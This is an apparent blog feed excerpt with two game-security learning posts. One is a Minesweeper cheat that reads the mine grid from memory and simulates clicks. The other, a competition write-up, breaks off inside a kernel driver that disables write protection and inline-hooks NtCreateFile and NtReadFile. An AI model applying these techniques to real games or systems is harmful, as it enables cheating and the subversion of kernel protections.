    <content type="html"><![CDATA[<p>游戏安全的学习（5）—— 模拟外挂学习（基于扫雷）。</p><span id="more"></span><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>当时主要 PATCH 了一些指令让它能够方便自己去运行，但是还有一些更酷的操作没试过，比如说拿到雷的结构，然后鼠标模拟去点。</p><h2 id="数据分析"><a href="#数据分析" class="headerlink" title="数据分析"></a>数据分析</h2><p>首先还是先找出关键数据的位置，这个可以用CE去分析。</p><ul><li>winmine.exe+56A4：雷的个数</li><li>winmine.exe+56A8：地图高度</li><li>winmine.exe+56AC：地图宽度</li></ul><p>然后就是对雷的数据分析了，首先它应该是存了一个二维数组，一个格子应该保存这些状态：</p><ul><li>未被翻开（默认状态）</li><li>插旗</li><li>数字或者被翻开为空（为空可以理解为数字0，数字0默认就不显示）</li></ul><p>此时应当又有一个数组被存当前位置是否有雷，当然两个数组可以合并起来去写，当然在不清楚它怎么写代码的情况下肯定是按分开来做。</p><p>通过对第一个方格不断反复插旗找到数据，最终得到第一个格子的数据在</p><p>winmine.exe+5361</p><img src="/2024/04/25/Game5/1.png" class=""><p>并且看起来是一个字节大小的数组。</p><p>经过一番测试可得</p><ul><li>未翻开的值为 0F</li><li>插旗为 0E</li><li>问号为 0D</li></ul><p>翻开之后再看看内存</p><img src="/2024/04/25/Game5/2.png" class=""><p>可以看到，翻开的格子对应了 0x40，如果有数字，那么是 0x41，其实这里很明显，好像每一行之前都有一个 0x10 字节，然后把宽高改为 0xF，再把CE内存浏览拉一下，一点会有一个视觉盛宴</p><img src="/2024/04/25/Game5/3.png" class=""><p>感觉就像是定义了一个两倍高度的二维数组，偶数下标（0开始）的存了当前的格子状态和其它一系列的状态（后面发现它其实不过是第二维度被定死是0x20）。</p><p>所以据此写一个 DLL 获取雷区。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">WinMineModuleDlg::OnBnClickedButton1</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line">    DWORD Base = <span class="built_in">GetBaseAddr</span>();</span><br><span class="line">    DWORD Width = *(DWORD *)(WinMineModuleDlg::Width + Base);</span><br><span class="line">    DWORD Height = *(DWORD *)(WinMineModuleDlg::Height + Base);</span><br><span class="line">    BYTE* MineMapAddr = (BYTE *)(WinMineModuleDlg::MineMapAddr + Base);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (Width * Height &gt;= <span class="number">100</span> * <span class="number">100</span>) &#123;</span><br><span class="line">        <span class="built_in">MessageBox</span>(<span class="literal">NULL</span>, <span class="string">L&quot;Wrong size for minemap&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    WCHAR Msg[<span class="number">0x10000</span>];</span><br><span class="line">    <span class="built_in">memset</span>(Msg, <span class="number">0</span>, <span class="number">0x10000</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt;= Height; j++) &#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>;i&lt;=Width;i++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (i) &#123;</span><br><span class="line">                MineMap[j][i - <span class="number">1</span>] = (*(MineMapAddr + j * <span class="number">32</span> + i) == <span class="number">0x8F</span> ? <span class="number">1</span> : <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">wsprintf</span>(Msg, <span class="string">L&quot;%d*%d\n&quot;</span>, Width, Height);</span><br><span class="line">    <span class="built_in">memset</span>(Msg, <span class="number">0</span>, <span class="number">0x10000</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; Height; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; Width; j++) &#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (MineMap[i][j]) &#123;</span><br><span class="line">                <span class="built_in">StrCatW</span>(Msg, <span class="string">L&quot;0 &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">StrCatW</span>(Msg, <span class="string">L&quot;1 &quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">StrCatW</span>(Msg, <span class="string">L&quot;\r\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">SetDlgItemText</span>(IDC_EDIT1, Msg);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="鼠标模拟"><a href="#鼠标模拟" class="headerlink" title="鼠标模拟"></a>鼠标模拟</h2><p>我们都知道，Windows 的窗体是通过消息机制去实现的，点了一个地方窗体会接受到对应的一个点击消息，坐标随参数在消息中，现在已经知道了所有雷的位置，那么就通过 <code>PostMessage</code> 这个 API 去进行一个鼠标模拟。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">WinMineModuleDlg::OnBnClickedButton2</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// <span class="doctag">TODO:</span> 在此添加控件通知处理程序代码</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> pos[<span class="number">2</span>] = &#123; <span class="number">0</span>,<span class="number">0</span> &#125;;</span><br><span class="line">    DWORD Base = <span class="built_in">GetBaseAddr</span>();</span><br><span class="line">    DWORD Width = *(DWORD *)(WinMineModuleDlg::Width + Base);</span><br><span class="line">    DWORD Height = *(DWORD *)(WinMineModuleDlg::Height + Base);</span><br><span class="line">    HWND hwnd = ::<span class="built_in">FindWindow</span>(<span class="literal">NULL</span>, <span class="built_in">TEXT</span>(<span class="string">&quot;扫雷&quot;</span>));</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">short</span> xbase = <span class="number">20</span>, ybase = <span class="number">60</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (hwnd == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">MessageBox</span>(<span class="string">L&quot;扫雷未打开&quot;</span>, <span class="string">L&quot;error&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; Height; i++) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> j = <span class="number">0</span>; j &lt; Width; j++) &#123;</span><br><span class="line">            pos[<span class="number">0</span>] = xbase + j * <span class="number">16</span>;</span><br><span class="line">            pos[<span class="number">1</span>] = ybase + i * <span class="number">16</span>;</span><br><span class="line">            <span class="keyword">if</span> (WinMineModuleDlg::MineMap[i][j]==<span class="number">1</span>) &#123;<span class="comment">//有雷</span></span><br><span class="line">                ::<span class="built_in">PostMessage</span>(hwnd, WM_RBUTTONDOWN, MK_RBUTTON, *(<span class="type">int</span> *)pos);</span><br><span class="line">                ::<span class="built_in">PostMessage</span>(hwnd, WM_RBUTTONUP, <span class="number">0</span>, *(<span class="type">int</span> *)pos);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                ::<span class="built_in">PostMessage</span>(hwnd, WM_LBUTTONDOWN, MK_LBUTTON, *(<span class="type">int</span> *)pos);</span><br><span class="line">                ::<span class="built_in">PostMessage</span>(hwnd, WM_LBUTTONUP, <span class="number">0</span>, *(<span class="type">int</span> *)pos);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="built_in">Sleep</span>(<span class="number">10</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>效果：</p><img src="/2024/04/25/Game5/4.png" class="">]]></content>
    
    
    <summary type="html">游戏安全的学习（5）—— 模拟外挂学习（基于扫雷）</summary>
    
    
    
    <category term="Windows" scheme="https://xia0ji233.github.io/categories/Windows/"/>
    
    <category term="GameSec" scheme="https://xia0ji233.github.io/categories/Windows/GameSec/"/>
    
    
  </entry>
  
  <entry>
    <title>腾讯游戏安全大赛2024决赛题解</title>
    <link href="https://xia0ji233.github.io/2024/04/22/tencent-race-2024-pre-final/"/>
    <id>https://xia0ji233.github.io/2024/04/22/tencent-race-2024-pre-final/</id>
    <published>2024-04-21T16:00:00.000Z</published>
    <updated>2024-04-21T16:42:18.850Z</updated>
    
    <content type="html"><![CDATA[<p>决赛打五天，是真的顶级，但是五天比一年学的东西都多…</p><p>本题<a href="attachment.zip">解题附件</a>自取</p><span id="more"></span><h2 id="2024腾讯游戏安全竞赛决赛题解"><a href="#2024腾讯游戏安全竞赛决赛题解" class="headerlink" title="2024腾讯游戏安全竞赛决赛题解"></a>2024腾讯游戏安全竞赛决赛题解</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><h4 id="自行加载loader-sys-找到用户名为administrator的KEY，作为答案提交（1分）"><a href="#自行加载loader-sys-找到用户名为administrator的KEY，作为答案提交（1分）" class="headerlink" title="自行加载loader.sys, 找到用户名为administrator的KEY，作为答案提交（1分）"></a>自行加载loader.sys, 找到用户名为administrator的KEY，作为答案提交（1分）</h4><p>Key 和 User 默认读 <code>C:\card.txt</code>，如果找不到或者是错误，那么加载会失败，于是想到 hook NtCreateFile 获取到文件句柄，再 hook NtReadFile 找到文件内容写入的地址。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntifs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntdef.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntstatus.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;ntddk.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_BACKTRACE_DEPTH 20</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SYMBOL <span class="string">L&quot;\\??\\xia0ji2333&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> kprintf(format, ...) DbgPrintEx(DPFLTR_IHVDRIVER_ID, DPFLTR_ERROR_LEVEL, format, ##__VA_ARGS__)</span></span><br><span class="line"></span><br><span class="line">UINT64 BaseAddr=<span class="literal">NULL</span>, DLLSize=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DeleteDevice</span><span class="params">(PDRIVER_OBJECT pDriver)</span> &#123;</span><br><span class="line">    kprintf((<span class="string">&quot;Line %d:xia0ji233: start delete device\n&quot;</span>), __LINE__);</span><br><span class="line">    <span class="keyword">if</span> (pDriver-&gt;DeviceObject) &#123;</span><br><span class="line">        UNICODE_STRING Sym;</span><br><span class="line">        RtlInitUnicodeString(&amp;Sym, SYMBOL);<span class="comment">//CreateFile </span></span><br><span class="line">        kprintf((<span class="string">&quot;Line %d:xia0ji233: Delete Symbol\n&quot;</span>), __LINE__);</span><br><span class="line">        IoDeleteSymbolicLink(&amp;Sym);</span><br><span class="line">        kprintf((<span class="string">&quot;Line %d:xia0ji233: Delete Device\n&quot;</span>), __LINE__);</span><br><span class="line">        IoDeleteDevice(pDriver-&gt;DeviceObject);</span><br><span class="line">    &#125;</span><br><span class="line">    kprintf((<span class="string">&quot;Line %d:xia0ji233: end delete device\n&quot;</span>), __LINE__);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">HANDLE FileHandler = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> newcode[] = &#123;</span><br><span class="line">    <span class="number">0x48</span>,<span class="number">0xB8</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="comment">//mov rax,xxx</span></span><br><span class="line">    <span class="number">0xFF</span>,<span class="number">0xE0</span><span class="comment">//jmp rax</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">char</span> oldcode[] = &#123;</span><br><span class="line">    <span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> newcode2[] = &#123;</span><br><span class="line">    <span class="number">0x48</span>,<span class="number">0xB8</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="comment">//mov rax,xxx</span></span><br><span class="line">    <span class="number">0xFF</span>,<span class="number">0xE0</span><span class="comment">//jmp rax</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">char</span> oldcode2[] = &#123;</span><br><span class="line">    <span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">    <span class="number">0x00</span>,<span class="number">0x00</span>,</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span>* target;</span><br><span class="line"><span class="type">char</span>* target2;</span><br><span class="line">KIRQL <span class="title function_">WPOFFx64</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    KIRQL irql = KeRaiseIrqlToDpcLevel();</span><br><span class="line">    UINT64 cr0 = __readcr0();</span><br><span class="line">    cr0 &amp;= <span class="number">0xfffffffffffeffff</span>;</span><br><span class="line">    __writecr0(cr0);</span><br><span class="line">    _disable();</span><br><span class="line">    <span class="keyword">return</span> irql;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">WPONx64</span><span class="params">(KIRQL irql)</span></span><br><span class="line">&#123;</span><br><span class="line">    UINT64 cr0 = __readcr0();</span><br><span class="line">    cr0 |= <span class="number">0x10000</span>;</span><br><span class="line">    _enable();</span><br><span class="line">    __writecr0(cr0);</span><br><span class="line">    KeLowerIrql(irql);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">Unhook</span><span class="params">()</span> &#123;</span><br><span class="line">    KIRQL irql = WPOFFx64();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(newcode); i++) &#123;</span><br><span class="line">        target[i] = oldcode[i];</span><br><span class="line">    &#125;</span><br><span class="line">    WPONx64(irql);</span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">Unhook2</span><span class="params">()</span> &#123;</span><br><span class="line">    KIRQL irql = WPOFFx64();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(newcode2); i++) &#123;</span><br><span class="line">        target2[i] = oldcode2[i];</span><br><span class="line">    &#125;</span><br><span class="line">    WPONx64(irql);</span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">Hook</span><span class="params">()</span> &#123;</span><br><span class="line">    KIRQL irql = WPOFFx64();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(newcode); i++) &#123;</span><br><span class="line">        target[i] = newcode[i];</span><br><span class="line">    &#125;</span><br><span class="line">    WPONx64(irql);</span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NTSTATUS <span class="title function_">Hook2</span><span class="params">()</span> &#123;</span><br><span class="line">    KIRQL irql = WPOFFx64();</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="keyword">sizeof</span>(newcode2); i++) &#123;</span><br><span class="line">        target2[i] = newcode2[i];</span><br><span class="line">    &#125;</span><br><span class="line">    WPONx64(irql);</span><br><span class="line">    <span class="keyword">return</span> STATUS_SUCCESS;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">PDRIVER_OBJECT g_Object = <span class="literal">NULL</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">LDR_DATA_TABLE_ENTRY</span> &#123;</span></span><br><span class="line">    LIST_ENTRY InLoadOrderLinks;</span><br><span class="line">    LIST_ENTRY InMemoryOrderLinks;</span><br><span class="line">    LIST_ENTRY InInitializationOrderLinks;</span><br><span class="line">    PVOID DllBase;</span><br><span class="line">    PVOID EntryPoint;<span class="comment">//驱动的进入点 DriverEntry  </span></span><br><span class="line">    ULONG SizeOfImage;</span><br><span class="line">    UNICODE_STRING FullDllName;<span class="comment">//驱动的满路径  </span></span><br><span class="line">    UNICODE_STRING BaseDllName;<span class="comment">//不带路径的驱动名字  </span></span><br><span class="line">    ULONG Flags;</span><br><span class="line">    USHORT LoadCount;</span><br><span class="line">    USHORT TlsIndex;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        LIST_ENTRY HashLinks;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            PVOID SectionPointer;</span><br><span class="line">            ULONG CheckSum;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            ULONG TimeDateStamp;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> &#123;</span></span><br><span class="line">            PVOID LoadedImports;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125; LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span> <span class="params">(* FuncPtr)</span> <span class="params">(</span></span><br><span class="line"><span class="params">    _Out_ PHANDLE FileHandle,</span></span><br><span class="line"><span class="params">    _In_ ACCESS_MASK DesiredAccess,</span></span><br><span class="line"><span class="params">    _In_ POBJECT_ATTRIBUTES ObjectAttributes,</span></span><br><span class="line"><span class="params">    _Out_ PIO_STATUS_BLOCK IoStatusBlock,</span></span><br><span class="line"><span class="params">    _In_opt_ PLARGE_INTEGER AllocationSize,</span></span><br><span class="line"><span class="params">    _In_ ULONG FileAttributes,</span></span><br><span class="line"><span class="params">    _In_ ULONG ShareAccess,</span></span><br><span class="line"><span class="params">    _In_ ULONG CreateDisposition,</span></span><br><span class="line"><span class="params">    _In_ ULONG CreateOptions,</span></span><br><span class="line"><span class="params">    _In_reads_bytes_opt_(EaLength) PVOID EaBuffer,</span></span><br><span class="line"><span class="params">    _In_ ULONG EaLength</span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span> <span class="params">(* FuncPtr2 )</span><span class="params">(</span></span><br><span class="line"><span class="params">    _In_ HANDLE FileHandle,</span></span><br><span class="line"><span class="params">    _In_opt_ HANDLE Event,</span></span><br><span class="line"><span class="params">    _In_opt_ PIO_APC_ROUTINE ApcRoutine,</span></span><br><span class="line"><span class="params">    _In_opt_ PVOID ApcContext,</span></span><br><span class="line"><span class="params">    _Out_ PIO_STATUS_BLOCK IoStatusBlock,</span></span><br><span class="line"><span class="params">    _Out_writes_bytes_(Length) PVOID Buffer,</span></span><br><span class="line"><span class="params">    _In_ ULONG Length,</span></span><br><span class="line"><span class="params">    _In_opt_ PLARGE_INTEGER ByteOffset,</span></span><br><span class="line"><span class="params">    _In_opt_ PULONG Key</span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line"></span><br><span class="line">ULONG  <span class="title function_">myCreateFile</span><span class="params">(_Out_ PHANDLE FileHandle,</span></span><br><span class="line"><span class="params">    _In_ ACCESS_MASK DesiredAccess,</span></span><br><span class="line"><span class="params">    _In_ POBJECT_ATTRIBUTES ObjectAttributes,</span></span><br><span class="line"><span class="params">    _Out_ PIO_STATUS_BLOCK IoStatusBlock,</span></span><br><span class="line"><span class="params">    _In_opt_ PLARGE_INTEGER AllocationSize,</span></span><br><span class="line"><span class="params">    _In_ ULONG FileAttributes,</span></span><br><span class="line"><span class="params">    _In_ ULONG ShareAccess,</span></span><br><span class="line"><span class="params">    _In_ ULONG CreateDisposition,</span></span><br><span class="line"><span class="params">    _In_ ULONG CreateOptions,</span></span><br><span class="line"><span class="params">    _In_reads_bytes_opt_(EaLength) PVOID EaBuffer,</span></span><br><span class="line"><span class="params">    _In_ ULONG EaLength)</span> &#123;</span><br><span class="line"></span><br><span class="line">    Unhook();</span><br><span class="line">    FuncPtr func = (FuncPtr)target;</span><br><span class="line"></span><br><span class="line">    NTSTATUS s = func(FileHandle,DesiredAccess,ObjectAttributes,IoStatusBlock,AllocationSize,FileAttributes,ShareAccess,CreateDisposition,CreateOptions,EaBuffer,EaLength);</span><br><span class="line">    <span class="keyword">if</span> (!wcscmp(ObjectAttributes-&gt;ObjectName-&gt;Buffer, <span class="string">L&quot;\\??\\C:\\card.txt&quot;</span>)) &#123;</span><br><span class="line">        kprintf((<span class="string">&quot;call NtCreateFile(%p,%p,%S,%p,%p,%p,%p,%p,%p,%p,%p)\n&quot;</span>), FileHandle,DesiredAccess,ObjectAttributes-&gt;ObjectName-&gt;Buffer,IoStatusBlock,AllocationSize,FileAttributes,ShareAccess,CreateDisposition,CreateOptions,EaBuffer,EaLength);</span><br><span class="line">        